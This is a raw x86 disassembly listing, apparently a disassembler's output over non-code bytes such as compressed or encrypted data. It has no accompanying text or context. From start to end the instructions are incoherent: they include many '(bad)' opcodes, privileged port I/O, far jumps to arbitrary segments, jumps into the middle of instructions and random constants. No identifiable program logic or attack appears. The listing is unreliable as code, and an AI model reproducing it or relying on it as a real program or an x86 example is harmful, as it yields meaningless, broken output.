  403258:	in     eax,0x98
  40325a:	test   cl,al
  40325c:	cdq    
  40325d:	dec    ebp
  40325e:	or     al,0x2d
  403260:	call   0x819f13dc
  403265:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403266:	xchg   edx,eax
  403267:	es jge 0x403255
  40326a:	xchg   ebp,ecx
  40326c:	enter  0xda73,0x7
  403270:	stos   BYTE PTR es:[edi],al
  403271:	ret    0xb81b
  403274:	nop
  403275:	mov    ebp,0xcd8f2e1e
  40327a:	scas   al,BYTE PTR es:[edi]
  40327b:	adc    BYTE PTR [edx+eax*2+0x25],ch
  40327f:	and    eax,0x789b339b
  403284:	imul   ebp,DWORD PTR [ebx],0xed35a895
  40328a:	xor    ebx,DWORD PTR [edi+0x72ad0b0e]
  403290:	dec    ebp
  403291:	nop
  403292:	sub    DWORD PTR [ecx],edi
  403294:	cdq    
  403295:	mov    ah,0x1
  403297:	adc    ah,bl
  403299:	mov    ebx,0x337f3d92
  40329e:	push   ds
  40329f:	(bad)  
  4032a0:	mov    al,0x2f
  4032a2:	bound  eax,QWORD PTR [ebx]
  4032a4:	sub    BYTE PTR [ebx],dl
  4032a6:	xchg   DWORD PTR [esi+edi*8],ebp
  4032a9:	jbe    0x403289
  4032ab:	xor    ch,BYTE PTR gs:[edi+0x30c20ead]
  4032b2:	xor    DWORD PTR [ebp+0x38],ebx
  4032b5:	lods   eax,DWORD PTR ds:[esi]
  4032b6:	pop    es
  4032b7:	pop    ebp
  4032b8:	lds    esi,FWORD PTR ds:0x330f1a98
  4032be:	rcl    BYTE PTR [edi-0x53d4dc63],1
  4032c4:	inc    edx
  4032c5:	fbstp  TBYTE PTR [ebx]
  4032c7:	jb     0x40333b
  4032c9:	das    
  4032ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032cb:	int3   
  4032cc:	jl     0x403339
  4032ce:	stc    
  4032cf:	dec    esi
  4032d0:	icebp  
  4032d1:	or     BYTE PTR [ebx-0x15],dh
  4032d4:	xor    esp,eax
  4032d6:	dec    ecx
  4032d7:	pop    ds
  4032d8:	adc    eax,0x552e294b
  4032dd:	rol    BYTE PTR [ebx+0x2a4927af],1
  4032e3:	mov    ecx,0xa0e2afbc
  4032e8:	std    
  4032e9:	mov    ch,0xbe
  4032eb:	out    dx,eax
  4032ec:	jecxz  0x403362
  4032ee:	mov    edx,0xec6eaa9c
  4032f3:	aaa    
  4032f4:	inc    DWORD PTR [edx]
  4032f6:	add    eax,0xbb760123
  4032fb:	cmp    al,cl
  4032fd:	mov    al,0x6e
  4032ff:	sbb    ch,dl
  403301:	sub    al,BYTE PTR cs:[eax+0x4073d793]
  403308:	jp     0x4032f3
  40330a:	jmp    0x1d2e0917
  40330f:	push   ecx
  403310:	inc    ebx
  403311:	lods   al,BYTE PTR ds:[esi]
  403312:	dec    edi
  403313:	xor    dl,BYTE PTR [ecx-0x4968778f]
  403319:	mov    dh,0x1b
  40331b:	jmp    0x8ed1:0x9944d28f
  403322:	popa   
  403323:	and    DWORD PTR [edi],0x47
  403326:	mov    ah,0x10
  403328:	pop    esp
  403329:	push   cs
  40332a:	aam    0xc7
  40332c:	jge    0x403305
  40332e:	arpl   WORD PTR [eax-0x7f],bx
  403331:	pop    edx
  403332:	pop    ebx
  403333:	mov    dh,0x96
  403335:	jg     0x403343
  403337:	out    0x83,eax
  403339:	sbb    DWORD PTR ds:0xc9fe9611,0xffffffa7
  403340:	or     al,BYTE PTR [ebx-0x1b98113c]
  403346:	out    dx,al
  403347:	xor    DWORD PTR [eax-0x6e],edi
  40334a:	pop    eax
  40334b:	adc    DWORD PTR [ecx],edx
  40334d:	outs   dx,DWORD PTR ds:[esi]
  40334e:	sti    
  40334f:	xacquire xchg DWORD PTR [edi+eax*8-0xb],ecx
  403354:	je     0x40332d
  403356:	fidivr DWORD PTR [ebx]
  403358:	xchg   edx,eax
  403359:	es mov dh,0x66
  40335c:	inc    eax
  40335d:	cs popw ss
  403360:	outs   dx,DWORD PTR ds:[esi]
  403361:	daa    
  403362:	fwait
  403363:	xor    al,0x8f
  403365:	xchg   esi,eax
  403366:	hlt    
  403367:	adc    esp,DWORD PTR [ebx-0x5a4cd16f]
  40336d:	add    al,0xd7
  40336f:	push   ebp
  403370:	(bad)  
  403371:	daa    
  403372:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403373:	test   DWORD PTR ds:0x6b38536c,edx
  403379:	scas   al,BYTE PTR es:[edi]
  40337a:	mov    eax,ds:0x62e6a314
  40337f:	leave  
  403380:	dec    ebx
  403381:	lods   al,BYTE PTR ds:[esi]
  403382:	fmul   st(2),st
  403384:	ss enter 0x84ae,0xb7
  403389:	dec    esi
  40338a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40338b:	in     al,0x28
  40338d:	fild   QWORD PTR [edx-0xd]
  403390:	(bad)  
  403391:	mov    dh,ch
  403393:	test   BYTE PTR [ebp+0x588f919],bh
  403399:	mov    gs,WORD PTR [ecx+0x53]
  40339c:	mov    ah,0x26
  40339e:	xor    BYTE PTR [ecx+0x44c0b357],al
  4033a4:	cmp    eax,0x13afcb1
  4033a9:	inc    bh
  4033ab:	dec    eax
  4033ac:	and    DWORD PTR [edi],ecx
  4033ae:	and    BYTE PTR [eax-0x4e],dh
  4033b1:	mov    eax,ds:0x3f8b2268
  4033b6:	inc    esp
  4033b7:	arpl   WORD PTR [ebp-0x34],si
  4033ba:	ret    
  4033bb:	mov    esi,0xb989a83f
  4033c0:	es lahf 
  4033c2:	and    al,0x60
  4033c4:	xor    al,0x74
  4033c6:	pop    esp
  4033c7:	dec    esp
  4033c8:	es iret 
  4033ca:	jnp    0x4033fd
  4033cc:	sti    
  4033cd:	pop    eax
  4033ce:	out    dx,al
  4033cf:	mov    ds:0xfbb5fbc2,al
  4033d4:	(bad)
  4033d7:	jno    0x403380
  4033d9:	xor    esp,DWORD PTR [esi+0x2b389225]
  4033df:	stos   DWORD PTR es:[edi],eax
  4033e0:	loope  0x4033f2
  4033e2:	add    ch,0x60
  4033e5:	fyl2xp1 
  4033e7:	enter  0x69fb,0x8f
  4033eb:	or     BYTE PTR [ecx+0xc],bh
  4033ee:	mov    eax,ds:0x6417fe62
  4033f3:	mov    ch,0x19
  4033f5:	push   cs
  4033f6:	ret    
  4033f7:	or     BYTE PTR [esi],ch
  4033f9:	test   eax,0xd96a7983
  4033fe:	pop    edi
  4033ff:	popf   
  403400:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403401:	lods   al,BYTE PTR ds:[esi]
  403402:	aad    0x39
  403404:	mov    eax,eax
  403406:	or     DWORD PTR [eax],0x94d9f866
  40340c:	int3   
  40340d:	test   eax,0xe130a996
  403412:	xor    eax,0xc7626f96
  403417:	add    eax,0x91a5ba74
  40341c:	stos   BYTE PTR es:[edi],al
  40341d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40341e:	cmpxchg BYTE PTR [ebx-0x5d243798],dh
  403425:	dec    ebx
  403426:	loop   0x403488
  403428:	in     al,0x8c
  40342a:	mov    ch,0xd9
  40342c:	adc    edi,DWORD PTR [edi]
  40342e:	fwait
  40342f:	pop    edi
  403430:	xor    eax,DWORD PTR [esp+edx*4+0x3f]
  403434:	jnp    0x403474
  403436:	dec    ebx
  403437:	inc    esp
  403438:	nop
  403439:	imul   ebx,DWORD PTR [eax+0x5b],0xffffffbc
  40343d:	adc    al,0x89
  40343f:	and    DWORD PTR [ecx],esi
  403441:	mov    WORD PTR [ecx+0x6],?
  403444:	fldpi  
  403446:	push   es
  403447:	aad    0x4a
  403449:	cmp    al,BYTE PTR [eax]
  40344b:	xchg   esi,eax
  40344c:	dec    ebx
  40344d:	clc    
  40344e:	mov    ecx,0x35eb7591
  403453:	lea    esi,[ebx]
  403455:	mov    eax,0xfcfe4159
  40345a:	push   ds
  40345b:	aaa    
  40345c:	aas    
  40345d:	daa    
  40345e:	pushf  
  40345f:	outs   dx,BYTE PTR ds:[esi]
  403460:	jle    0x403485
  403462:	mov    ebp,0x68a0ed14
  403467:	or     DWORD PTR [ebp+0x5d],esp
  40346a:	loopne 0x403409
  40346c:	mov    WORD PTR [edx-0x15440575],?
  403472:	sbb    dl,BYTE PTR [edi-0x3d6ab2e3]
  403478:	adc    ch,BYTE PTR [ebx-0x4d2c9f30]
  40347e:	lds    ebx,FWORD PTR [edi+0x2e]
  403481:	cdq    
  403482:	cli    
  403483:	mov    BYTE PTR [ebp-0x682153da],dh
  403489:	and    DWORD PTR [eax+edi*4-0x46],ebp
  40348d:	jmp    0xb686ce49
  403492:	pop    ecx
  403493:	(bad)  
  403494:	aaa    
  403495:	gs xchg ebp,eax
  403497:	addr16 js 0x403432
  40349a:	cmp    bl,0x3c
  40349d:	jno    0x40348b
  40349f:	jg     0x40344f
  4034a1:	je     0x4034e6
  4034a3:	fs in  eax,dx
  4034a5:	adc    al,0xc1
  4034a7:	cmp    eax,0x4afb8a4e
  4034ac:	and    eax,DWORD PTR [eax]
  4034ae:	addr16 xchg esp,eax
  4034b0:	cli    
  4034b1:	repnz mov eax,0x541fa170
  4034b7:	repz dec ebx
  4034b9:	stc    
  4034ba:	scas   al,BYTE PTR es:[edi]
  4034bb:	cmp    cl,BYTE PTR [ecx+eax*1+0x7b]
  4034bf:	icebp  
  4034c0:	mov    ebp,0xe4c2d472
  4034c5:	xor    al,0xe9
  4034c7:	push   0x67
  4034c9:	mov    ds:0x6a1a643a,al
  4034ce:	neg    dh
  4034d0:	push   0xffffff99
  4034d2:	adc    eax,0x7ae61cd5
  4034d7:	xchg   ecx,eax
  4034d8:	mov    esp,0x3d6f7d64
  4034dd:	sbb    al,0x9e
  4034df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034e0:	adc    BYTE PTR [ebx+0x38a1d12d],dh
  4034e6:	jge    0x4034b9
  4034e8:	frstor [eax+0x21abc23c]
  4034ee:	sbb    ecx,DWORD PTR [edx]
  4034f0:	icebp  
  4034f1:	ret    0xc91b
  4034f4:	mov    cl,0x93
  4034f6:	mov    ebp,0xfa3684d7
  4034fb:	les    eax,FWORD PTR [eax+edi*8]
  4034fe:	xchg   ecx,eax
  4034ff:	xor    DWORD PTR [edi+0x2ebea586],ecx
  403505:	(bad)  
  403506:	mov    cl,0x2e
  403508:	lahf   
  403509:	popf   
  40350a:	jne    0x40353b
  40350c:	mov    dh,0x93
  40350e:	mov    bl,0x68
  403510:	jne    0x4034e9
  403512:	xchg   edi,eax
  403513:	adc    BYTE PTR [edx],0x8d
  403516:	sub    DWORD PTR [edx-0x53],0xd35a7169
  40351d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40351e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40351f:	dec    BYTE PTR [esi-0x4b]
  403522:	stos   DWORD PTR es:[edi],eax
  403523:	in     al,dx
  403524:	ins    BYTE PTR es:[edi],dx
  403525:	aas    
  403526:	xchg   esp,eax
  403527:	inc    edx
  403528:	ja     0x4034f6
  40352a:	push   eax
  40352b:	jp     0x4034ba
  40352d:	lods   al,BYTE PTR ds:[esi]
  40352e:	inc    edi
  40352f:	and    esi,edx
  403531:	ficom  DWORD PTR [ebx-0x7f57be7]
  403537:	sbb    eax,0xd5a7912b
  40353c:	dec    edx
  40353d:	adc    eax,0x97a65212
  403542:	and    eax,0x9e9fd55f
  403547:	mov    dl,0xa
  403549:	cmp    eax,0x4f07b0cd
  40354e:	pop    ss
  40354f:	sbb    dl,BYTE PTR [edx-0x11]
  403552:	inc    eax
  403553:	popf   
  403554:	pop    ebx
  403555:	cs or  edx,ebx
  403558:	leave  
  403559:	test   eax,0x383f2327
  40355e:	int    0x4
  403560:	mov    al,ds:0xa775fd8f
  403565:	pop    esi
  403566:	or     DWORD PTR [ebx-0x55],ecx
  403569:	push   ebp
  40356a:	add    bh,0x3a
  40356d:	jae    0x4035b4
  40356f:	not    BYTE PTR [edi-0xde17879]
  403575:	pop    edx
  403576:	mov    ch,0x4
  403578:	addr16 cmp ax,0x7108
  40357d:	les    esi,FWORD PTR [edi]
  40357f:	dec    ebp
  403580:	pop    ebx
  403581:	es mov esp,0xc25a3d94
  403587:	stc    
  403588:	dec    BYTE PTR [edi+0x2123fc33]
  40358e:	xchg   esi,eax
  40358f:	push   ss
  403590:	and    ebp,ecx
  403592:	std    
  403593:	adc    bl,BYTE PTR [ebp+0x35]
  403596:	loope  0x4035ca
  403598:	dec    edi
  403599:	xchg   ecx,eax
  40359a:	cmp    DWORD PTR [edi-0x68dc3ba8],ebx
  4035a0:	(bad)  
  4035a1:	xchg   edx,eax
  4035a2:	lea    edx,[eax+0x2462ba29]
  4035a8:	popa   
  4035a9:	mov    ebx,0x9e7f9db
  4035ae:	adc    eax,0xa34e77d4
  4035b3:	scas   eax,DWORD PTR es:[edi]
  4035b4:	push   cs
  4035b5:	stos   DWORD PTR es:[edi],eax
  4035b6:	inc    edx
  4035b7:	cwde   
  4035b8:	out    0x1f,al
  4035ba:	repnz inc dx
  4035bd:	cmp    edx,DWORD PTR [eax+esi*8-0x26]
  4035c1:	or     eax,0xc9ef2fdb
  4035c6:	shl    BYTE PTR [esi+0x4862eb84],0x7e
  4035cd:	fwait
  4035ce:	push   ebp
  4035cf:	mov    edx,0xfdf48671
  4035d4:	mov    ds:0xce1fd6b9,al
  4035d9:	loope  0x4035f0
  4035db:	repz test DWORD PTR [edx-0x5d9d10d9],esi
  4035e2:	xor    eax,0xd33048f4
  4035e7:	xor    ebp,DWORD PTR [eax]
  4035e9:	cmc    
  4035ea:	cmp    al,0xa
  4035ec:	fmul   DWORD PTR [esp+ebx*2]
  4035ef:	push   0x6c5b1cef
  4035f4:	mov    al,0xad
  4035f6:	lock mov ebp,0x3afb6d78
  4035fc:	add    bh,BYTE PTR [ebp+0x49]
  4035ff:	mov    bl,0x98
  403601:	pop    eax
  403602:	push   eax
  403603:	adc    DWORD PTR [eax-0x1a2c25b],edi
  403609:	jns    0x4035f1
  40360b:	pop    ebx
  40360c:	jo     0x40364c
  40360e:	out    0xbd,eax
  403610:	jmp    0x403609
  403612:	xor    eax,0xab4d8356
  403617:	in     al,0xc7
  403619:	loopne 0x40362c
  40361b:	test   BYTE PTR ds:0x14f02c19,cl
  403621:	dec    esi
  403622:	test   DWORD PTR [edx-0x7a414f51],eax
  403628:	retf   
  403629:	pop    ebx
  40362a:	fst    DWORD PTR [ecx+0x29]
  40362d:	mov    bh,0x9e
  40362f:	sbb    DWORD PTR [ecx],esi
  403631:	loopne 0x4036b1
  403633:	loopne 0x40366c
  403635:	xor    ecx,DWORD PTR [ebp+0x40abdbea]
  40363b:	inc    edi
  40363c:	mov    ds:0xbd4e677e,eax
  403641:	inc    edx
  403642:	inc    ebp
  403643:	inc    esi
  403644:	push   0x25
  403646:	clc    
  403647:	inc    edi
  403648:	mov    dh,0xad
  40364a:	ret    0x20d9
  40364d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40364e:	xchg   esp,eax
  40364f:	call   0xf45b233b
  403654:	mov    ax,bp
  403657:	sub    al,0xcf
  403659:	sbb    eax,0x16fbb248
  40365e:	popa   
  40365f:	jnp    0x403699
  403661:	std    
  403662:	and    al,0xa7
  403664:	sbb    esi,DWORD PTR cs:[eax+0x2a]
  403668:	jne    0x40367d
  40366a:	sbb    esi,0xffffffc7
  40366d:	mov    al,ds:0x751d662c
  403672:	(bad)
  403676:	jle    0x4036bc
  403678:	pop    ecx
  403679:	fucomip st,st(0)
  40367b:	push   edi
  40367c:	es ss (bad) 
  40367f:	(bad)  
  403680:	push   ecx
  403681:	out    0xd6,al
  403683:	dec    esp
  403684:	and    bl,BYTE PTR [edx+ecx*1]
  403687:	in     eax,dx
  403688:	je     0x40360b
  40368a:	sahf   
  40368b:	(bad)  
  40368d:	(bad)  
  40368e:	pop    edi
  40368f:	shl    ah,0xb4
  403692:	xchg   DWORD PTR [eax-0x10cc104b],ecx
  403698:	add    esi,edi
  40369a:	sub    cl,BYTE PTR [eax]
  40369c:	xor    al,0x95
  40369e:	push   ds
  40369f:	(bad)  
  4036a0:	push   ebp
  4036a1:	mov    ch,0xc0
  4036a3:	jmp    0x403667
  4036a5:	dec    edx
  4036a6:	inc    ecx
  4036a7:	pop    eax
  4036a8:	loop   0x4036e2
  4036aa:	fwait
  4036ab:	mov    ebp,0x640016ac
  4036b0:	fwait
  4036b1:	xchg   ebx,eax
  4036b2:	stos   DWORD PTR es:[edi],eax
  4036b3:	pop    esp
  4036b4:	pop    ebx
  4036b5:	push   edx
  4036b6:	mov    esi,DWORD PTR [ebx]
  4036b8:	dec    edi
  4036b9:	imul   ebx,DWORD PTR [esi],0x10
  4036bc:	xor    DWORD PTR [esi*2-0x3658d8d9],0xeaf61ccd
  4036c7:	inc    ebp
  4036c8:	ficom  WORD PTR [edi-0x55809f6]
  4036ce:	sbb    esi,esi
  4036d0:	retf   0xd310
  4036d3:	daa    
  4036d4:	mov    al,0xe0
  4036d6:	sbb    al,BYTE PTR [eax+ecx*2-0x2e]
  4036da:	dec    edi
  4036db:	mov    ds:0xd3c18d5c,eax
  4036e0:	fist   DWORD PTR [esi-0x3e]
  4036e3:	aad    0xff
  4036e5:	mov    al,ds:0x9b74ec85
  4036ea:	push   ss
  4036eb:	jl     0x4036b1
  4036ed:	or     ch,BYTE PTR [ebp-0x1e]
  4036f0:	hlt    
  4036f1:	jp     0x4036b1
  4036f3:	repz sub eax,0x9e1d6168
  4036f9:	pop    es
  4036fa:	mov    dl,0x64
  4036fc:	xchg   ebx,eax
  4036fd:	xchg   ebp,eax
  4036fe:	and    BYTE PTR [ecx-0x5c7aeec8],bh
  403704:	cmp    ecx,DWORD PTR [ecx+0x6df3832c]
  40370a:	xor    esi,DWORD PTR [eax+ebx*4]
  40370d:	dec    ebx
  40370e:	sbb    al,bh
  403710:	jbe    0x403760
  403712:	stos   BYTE PTR es:[edi],al
  403713:	test   DWORD PTR [edx-0x312b503f],eax
  403719:	xchg   ebp,eax
  40371a:	push   ss
  40371b:	sbb    DWORD PTR [ebx+0x17],ebp
  40371e:	xchg   BYTE PTR [ebx+0x2f],dl
  403721:	outs   dx,BYTE PTR ds:[esi]
  403722:	hlt    
  403723:	adc    DWORD PTR [eax+eax*8-0x69c8a5d5],0x2e45962d
  40372e:	pop    eax
  40372f:	fs push eax
  403731:	stc    
  403732:	push   edi
  403733:	arpl   dx,bp
  403735:	out    0xc8,eax
  403737:	outs   dx,DWORD PTR ds:[esi]
  403738:	je     0x4037b5
  40373a:	jno    0x403752
  40373c:	or     eax,0xebc357e
  403741:	jl     0x40377a
  403743:	lahf   
  403744:	push   cs
  403745:	(bad)  
  403746:	push   cs
  403747:	out    dx,eax
  403748:	dec    ebp
  403749:	jnp    0x40370d
  40374b:	mov    ch,BYTE PTR [edx+0x25]
  40374e:	pushf  
  40374f:	jns    0x40376f
  403751:	lahf   
  403752:	mov    eax,ds:0xee40706a
  403757:	iret   
  403758:	push   edx
  403759:	jecxz  0x4037d7
  40375b:	jno    0x4036ff
  40375d:	mov    ds:0x8e6cc56d,eax
  403762:	iret   
  403763:	mov    cl,BYTE PTR gs:[edx-0x3405c2ae]
  40376a:	je     0x403734
  40376c:	push   esi
  40376d:	mov    ebp,0xbec6cbf8
  403772:	adc    eax,0x47fbe35b
  403777:	mov    DWORD PTR [esi+0x5f6bf292],edx
  40377d:	(bad)  
  40377e:	pushf  
  40377f:	aad    0x94
  403781:	mov    BYTE PTR [esi+0xc],al
  403784:	cld    
  403785:	mov    ds:0x5ccdd7d4,eax
  40378a:	cdq    
  40378b:	addr16 in al,dx
  40378d:	jle    0x403803
  40378f:	out    dx,al
  403790:	pop    edx
  403791:	mov    ah,0x3e
  403793:	js     0x403809
  403795:	dec    edx
  403796:	cld    
  403797:	rcl    DWORD PTR [ebp+0x3a],1
  40379a:	mov    dh,0xaa
  40379c:	mov    cl,BYTE PTR [edi+0x40]
  40379f:	test   eax,0x700d6507
  4037a4:	lds    eax,FWORD PTR [ebp-0x39]
  4037a7:	cld    
  4037a8:	ss retf 0x650c
  4037ac:	adc    al,0x1e
  4037ae:	jp     0x403769
  4037b0:	dec    ebp
  4037b1:	mov    edi,0xe208afe9
  4037b6:	fneni(8087 only) 
  4037b8:	add    ebp,DWORD PTR [eax+ebx*2+0x5e4d18d7]
  4037bf:	jg     0x40375a
  4037c1:	push   esi
  4037c2:	inc    esi
  4037c3:	stos   BYTE PTR es:[edi],al
  4037c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037c5:	pop    eax
  4037c6:	addr16 and eax,0x5ced7d7e
  4037cc:	(bad)  
  4037cd:	(bad)
  4037d1:	push   ebx
  4037d2:	in     al,0xe4
  4037d4:	arpl   WORD PTR ds:[edx+0x41],di
  4037d8:	inc    esi
  4037d9:	(bad)  
  4037da:	jmp    0xab84:0x1928c2b1
  4037e1:	call   0xfb06:0xab83df96
  4037e8:	in     al,dx
  4037e9:	out    dx,eax
  4037ea:	and    BYTE PTR [ecx-0x7fe7d3dd],al
  4037f0:	rcr    ebp,0xd0
  4037f3:	add    edi,eax
  4037f5:	into   
  4037f6:	dec    edi
  4037f7:	xchg   edx,eax
  4037f8:	out    dx,al
  4037f9:	dec    ebx
  4037fa:	loope  0x403867
  4037fc:	cmp    eax,DWORD PTR [ebp-0x5f]
  4037ff:	sbb    ebp,ecx
  403801:	sahf   
  403802:	push   0xfc82115b
  403807:	xlat   BYTE PTR ds:[ebx]
  403808:	jge    0x40379e
  40380a:	jmp    0x3c64:0x34adba40
  403811:	mov    ebx,0x1f8ff160
  403817:	inc    eax
  403818:	dec    esi
  403819:	ds jg  0x403805
  40381c:	popa   
  40381d:	scas   al,BYTE PTR es:[edi]
  40381e:	jae    0x4037b0
  403820:	inc    esp
  403821:	xlat   BYTE PTR ds:[ebx]
  403822:	jl     0x4037ab
  403824:	mov    esp,0x9d79f263
  403829:	leave  
  40382a:	pop    ecx
  40382b:	pop    es
  40382c:	(bad)  [edi+edx*8+0x45b8e01e]
  403833:	addr16 add eax,0x29cd624d
  403839:	ja     0x403826
  40383b:	int3   
  40383c:	and    bh,BYTE PTR [esi+0x4b4dc3fd]
  403842:	lods   eax,DWORD PTR ds:[esi]
  403843:	fwait
  403844:	adc    ecx,ecx
  403846:	push   ebx
  403847:	or     BYTE PTR [edi-0x34],ah
  40384a:	lods   al,BYTE PTR ds:[esi]
  40384b:	jl     0x4038b6
  40384d:	cmp    BYTE PTR ds:0xc9c276ef,bl
  403853:	ins    BYTE PTR es:[edi],dx
  403854:	jne    0x403854
  403856:	fs xchg esp,eax
  403858:	(bad)  
  40385a:	shl    ch,1
  40385c:	loope  0x40388a
  40385e:	bound  esp,QWORD PTR [edi+0xb3e4775]
  403864:	icebp  
  403865:	mov    ds:0xdcd67ab6,al
  40386a:	lea    edx,[edi+ecx*1-0x746faf0a]
  403871:	test   eax,0x3c613618
  403876:	mov    esi,0xbc2b4aa1
  40387b:	push   0xf1a4160f
  403880:	daa    
  403881:	bound  edi,QWORD PTR [ecx+0x2981e694]
  403887:	daa    
  403888:	or     eax,0x8aa267
  40388d:	xchg   edi,eax
  40388e:	loope  0x403854
  403890:	das    
  403891:	ss (bad) 
  403893:	stc    
  403894:	int    0xd8
  403896:	adc    ah,BYTE PTR [esi+0x3b]
  403899:	dec    eax
  40389a:	call   FWORD PTR [edx+0x2e689e87]
  4038a0:	xchg   esi,eax
  4038a1:	pushf  
  4038a2:	loopne 0x4038c8
  4038a4:	int3   
  4038a5:	mov    al,0x73
  4038a7:	push   eax
  4038a8:	mov    al,ds:0xa2d06486
  4038ad:	sbb    edi,DWORD PTR [eax]
  4038af:	inc    ebx
  4038b0:	xchg   DWORD PTR [ebp+esi*8-0x52],ebp
  4038b4:	inc    ecx
  4038b5:	ins    DWORD PTR es:[edi],dx
  4038b6:	mov    ebx,0x2ec74e96
  4038bb:	js     0x40387a
  4038bd:	dec    edi
  4038be:	and    eax,0xf30db0d7
  4038c3:	lea    edi,[eax-0x15]
  4038c6:	shl    DWORD PTR [esi+0x16],1
  4038c9:	mov    edx,0x17019fbb
  4038ce:	and    edi,DWORD PTR [eax-0x75]
  4038d1:	sub    DWORD PTR [ecx+0x7f9e452e],ecx
  4038d7:	xchg   ebp,eax
  4038d8:	or     eax,0xa874e317
  4038dd:	push   ecx
  4038de:	repnz repnz xor al,0xdc
  4038e2:	add    ebx,edi
  4038e4:	inc    eax
  4038e5:	xchg   edx,eax
  4038e6:	jmp    0x403950
  4038e8:	lods   eax,DWORD PTR ds:[esi]
  4038e9:	rcl    BYTE PTR [ecx-0x41c91fda],1
  4038ef:	adc    BYTE PTR [edx],dl
  4038f1:	mov    dh,BYTE PTR [edx+0x13]
  4038f4:	(bad)  
  4038f5:	sar    DWORD PTR [eax],1
  4038f7:	mov    dh,0xbb
  4038f9:	pop    ss
  4038fa:	cld    
  4038fb:	inc    ecx
  4038fc:	data16 daa 
  4038fe:	jle    0x4038d3
  403900:	mov    esi,0xbba5d81f
  403905:	adc    eax,0x33bbce94
  40390a:	in     eax,0xc8
  40390c:	adc    eax,0x11f1aa97
  403911:	outs   dx,DWORD PTR ds:[esi]
  403912:	fcom   DWORD PTR [ebp+0x9]
  403915:	sub    al,0x3
  403917:	pop    es
  403918:	xchg   ebp,eax
  403919:	icebp  
  40391a:	xor    DWORD PTR ds:0x75d757e7,ebp
  403920:	add    al,0x63
  403922:	push   eax
  403923:	cld    
  403924:	test   ecx,esi
  403926:	das    
  403927:	sti    
  403928:	ds adc eax,0x64470a8
  40392e:	cdq    
  40392f:	add    ebp,esp
  403931:	int    0xcf
  403933:	jp     0x4038ce
  403935:	cwde   
  403936:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403937:	mov    ds:0x74eb94dc,eax
  40393c:	stos   BYTE PTR es:[edi],al
  40393d:	mov    ebp,0xcf67a5ff
  403942:	mov    ch,0x20
  403944:	shl    BYTE PTR [ebp-0x3d477225],cl
  40394a:	mov    ds:0xafebcac8,eax
  40394f:	fstp   TBYTE PTR [edi]
  403951:	jmp    0x403934
  403953:	add    al,0x74
  403955:	mov    ebp,0xe2941ef2
  40395a:	cmovle ebx,DWORD PTR [eax-0x58]
  40395e:	push   edx
  40395f:	pop    es
  403960:	adc    ecx,DWORD PTR [edi+esi*1]
  403963:	out    dx,eax
  403964:	xchg   BYTE PTR [eax],al
  403966:	mov    esp,0xa044a0c4
  40396b:	mov    DWORD PTR [eax+0x43d9acb5],ebp
  403971:	aaa    
  403972:	imul   edx,DWORD PTR [ecx+esi*1-0x5c],0x86c1586
  40397a:	outs   dx,BYTE PTR ds:[esi]
  40397b:	jecxz  0x403941
  40397d:	test   ecx,ebx
  40397f:	mov    bh,0x1c
  403981:	pop    ecx
  403982:	sub    BYTE PTR [ecx+eax*2],dl
  403985:	leave  
  403986:	mov    ah,0x6c
  403988:	(bad)  
  403989:	test   eax,0xa46a4201
  40398e:	push   0x55
  403990:	dec    edx
  403991:	pop    esi
  403992:	in     eax,0x3c
  403994:	out    dx,eax
  403995:	out    dx,eax
  403996:	repz add al,0x9c
  403999:	mov    BYTE PTR [esi],cl
  40399b:	cmc    
  40399c:	aas    
  40399d:	pop    edi
  40399e:	sub    esi,edx
  4039a0:	hlt    
  4039a1:	pop    edx
  4039a2:	je     0x4039bb
  4039a4:	gs ins BYTE PTR es:[edi],dx
  4039a6:	jg     0x403a19
  4039a8:	loope  0x40398e
  4039aa:	pop    esp
  4039ab:	lods   eax,DWORD PTR ds:[esi]
  4039ac:	mov    ds,esp
  4039ae:	ret    0x1cfd
  4039b1:	in     al,0xab
  4039b3:	push   0x5b0139ba
  4039b8:	or     DWORD PTR [esi+0x53e47f97],0x6081e2ba
  4039c2:	ins    DWORD PTR es:[edi],dx
  4039c3:	cmp    cl,BYTE PTR [edi+eiz*4-0x61]
  4039c7:	ret    0x9a8e
  4039ca:	xor    BYTE PTR [esi],bl
  4039cc:	lods   eax,DWORD PTR ds:[esi]
  4039cd:	pop    ds
  4039ce:	outs   dx,DWORD PTR ds:[esi]
  4039cf:	ds nop
  4039d1:	jl     0x40396d
  4039d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039d4:	mov    ds:0x22bea2c4,al
  4039d9:	inc    esp
  4039da:	sti    
  4039db:	lock test BYTE PTR [ecx-0x297bce5d],bl
  4039e2:	pop    es
  4039e3:	pop    esp
  4039e4:	int3   
  4039e5:	fwait
  4039e6:	pop    eax
  4039e7:	and    eax,0xe912589
  4039ec:	jmp    0x30b3:0xb953ec46
  4039f3:	cs push edx
  4039f5:	or     ebx,ecx
  4039f7:	sbb    al,cl
  4039f9:	mov    al,0x2e
  4039fb:	in     eax,dx
  4039fc:	mov    bl,0x61
  4039fe:	retf   0xe9fa
  403a01:	sbb    al,0x17
  403a03:	adc    BYTE PTR [edx+0x3a],ah
  403a06:	shl    ebx,1
  403a08:	and    bl,al
  403a0a:	faddp  st(1),st
  403a0c:	rcl    dh,cl
  403a0e:	aam    0xfe
  403a10:	pop    ebx
  403a11:	xchg   ebx,eax
  403a12:	cld    
  403a13:	rol    DWORD PTR [edi+0x2a],0x78
  403a17:	sar    DWORD PTR [edx-0x283c2ae4],0x4f
  403a1e:	int3   
  403a1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a20:	std    
  403a21:	ret    
  403a22:	sbb    al,0xbb
  403a24:	out    dx,al
  403a25:	xor    al,0xbb
  403a27:	mov    esp,0x36f6daf6
  403a2c:	loope  0x4039dc
  403a2e:	mov    ds:0x31d03f09,al
  403a33:	repnz rol BYTE PTR cs:[esi-0xd1c1acd],0xc7
